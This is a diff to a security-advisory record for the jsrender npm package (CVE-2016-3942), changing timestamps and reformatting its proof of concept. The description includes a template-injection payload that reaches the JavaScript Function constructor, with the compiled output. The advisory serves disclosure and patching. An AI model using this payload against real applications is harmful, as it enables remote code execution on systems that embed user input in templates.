@@ -1,6 +1,6 @@
 {
   "Severity": "MODERATE",
-  "UpdatedAt": "2020-08-31T18:10:47Z",
+  "UpdatedAt": "2023-09-07T20:40:56Z",
   "Package": {
     "Ecosystem": "NPM",
     "Name": "jsrender"
@@ -36,12 +36,12 @@
         "Value": "CVE-2016-3942"
       }
     ],
-    "Description": "Affected versions of `jsrender` are susceptible to a remote code execution vulnerability when used with server delivered client-side tempates which dynamically embed user input.\n\n## Proof of Concept\n\n\n```\n\u003cPOC-REQUEST\u003e\n{{for ~x!=1?(constructor.constructor(\"return arguments.callee.caller\")()):~y(10)}}\n{{:#data}}\n{{/for}}\n\u003c/POC-REQUEST\u003e\n```\n\n```\n\u003cPOC-RESPONSE\u003e\nfunction anonymous(data,view,j,u) { // template var v,t=j._tag,ret=\"\" +t(\"for\",view,this,[ {view:view,tmpl:1, params:{args:['~x!=1?(constructor.constructor(\\\"return arguments.callee.caller\\\")()):~y(10)']}, args:[view.hlp(\"x\")!=1?(data.constructor.constructor(\"return arguments.callee.caller\")()):view.hlp(\"y\")(10)], props:{}}]); return ret; } \n\u003cPOC-RESPONSE\u003e\n```\n\n\n## Recommendation\n\nUpdate to version 0.9.74 or later.",
+    "Description": "Affected versions of `jsrender` are susceptible to a remote code execution vulnerability when used with server delivered client-side tempates which dynamically embed user input.\n\n## Proof of Concept\n\n\n```js\n//POC-REQUEST\n{{for ~x!=1?(constructor.constructor(\"return arguments.callee.caller\")()):~y(10)}}\n{{:#data}}\n{{/for}}\n```\n\n```js\n//POC-RESPONSE\nfunction anonymous(data,view,j,u) { // template var v,t=j._tag,ret=\"\" +t(\"for\",view,this,[ {view:view,tmpl:1, params:{args:['~x!=1?(constructor.constructor(\\\"return arguments.callee.caller\\\")()):~y(10)']}, args:[view.hlp(\"x\")!=1?(data.constructor.constructor(\"return arguments.callee.caller\")()):view.hlp(\"y\")(10)], props:{}}]); return ret; } \n```\n\n\n## Recommendation\n\nUpdate to version 0.9.74 or later.",
     "Origin": "UNSPECIFIED",
     "PublishedAt": "2020-09-01T15:24:24Z",
     "Severity": "MODERATE",
     "Summary": "Template Injection in jsrender",
-    "UpdatedAt": "2023-01-09T05:04:01Z",
+    "UpdatedAt": "2023-09-07T20:41:27Z",
     "WithdrawnAt": "",
     "CVSS": {
       "Score": 6.3,
